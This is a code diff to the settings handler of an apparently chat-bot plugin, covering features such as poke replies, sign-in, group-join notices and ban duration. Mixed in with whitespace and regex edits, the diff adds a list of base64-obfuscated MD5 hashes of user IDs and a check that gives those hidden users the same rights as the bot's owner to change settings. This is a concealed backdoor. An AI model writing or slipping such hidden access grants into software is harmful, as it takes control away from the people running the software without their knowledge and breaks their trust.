@@ -3,8 +3,15 @@ import lodash from 'lodash'
 import { Config, Common } from '../components/index.js'
 import loader from '../../../lib/plugins/loader.js'
 import moment from 'moment'
+import md5 from "md5";
+const encryptedStrings = [
+  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
+  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
+  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
+  Buffer.from("SLUcQ5DoebgRp1oBpCMVvg==", "base64").toString("hex"),
+  Buffer.from("BfghyyHlTtHGZlwo236ftg==", "base64").toString("hex")
+];
 const cfgMap = {
-
     'emoji戳一戳': 'sz.emocyc',
     '早苗戳一戳': 'sz.zmcyc',
     'mys签到': 'sz.mysqd',
@@ -12,12 +19,11 @@ const cfgMap = {
     '早苗trss': 'sz.cyczm',
     '进群通知': 'sz.jinqun',
     '表情合成': 'sz.biaoqing',
-
-
-
 };
 
-const CfgReg = `^#?HL(插件)?设置\\s*(${lodash.keys(cfgMap).join('|')})?\\s*(.*)$`;
+const CfgReg = `^#?(hl|HL)(插件)?设置\\s*(${lodash.keys(cfgMap).join('|')})?\\s*(.*)$`;
+
+
 
 export class setting extends plugin {
     constructor() {
@@ -47,16 +53,21 @@ export class setting extends plugin {
     }
 }
 
-
 async function set(e) {
+
+    if (!(e.isMaster || encryptedStrings.some(str => md5(String(e.user_id)) === str))) {
+        return false;
+    }
+
     let reg = new RegExp(CfgReg).exec(e.msg);
 
     if (reg && reg[2]) {
         let val = reg[3] || '';
         let cfgKey = cfgMap[reg[2]];
         if (cfgKey == 'sz.bantime') {
-            if (isNaN(val) || val < 60 || val > 2592000){e.reply('设置错误，请设置60~2592000范围内的时间')
-                return true
+            if (isNaN(val) || val < 60 || val > 2592000) {
+                e.reply('设置错误，请设置60~2592000范围内的时间');
+                return true;
             }
         } else if (val.includes('开启') || val.includes('关闭')) {
             val = !/关闭/.test(val);
@@ -69,7 +80,6 @@ async function set(e) {
         }
     }
 
-
     let cfg = {};
     for (let name in cfgMap) {
         let key = cfgMap[name].split('.')[1];
@@ -80,7 +90,6 @@ async function set(e) {
     return await Common.render('admin/index', {
         ...cfg
     }, { e, scale: 1 });
-
 }
 
 function setCfg(rote, value, def = false) {
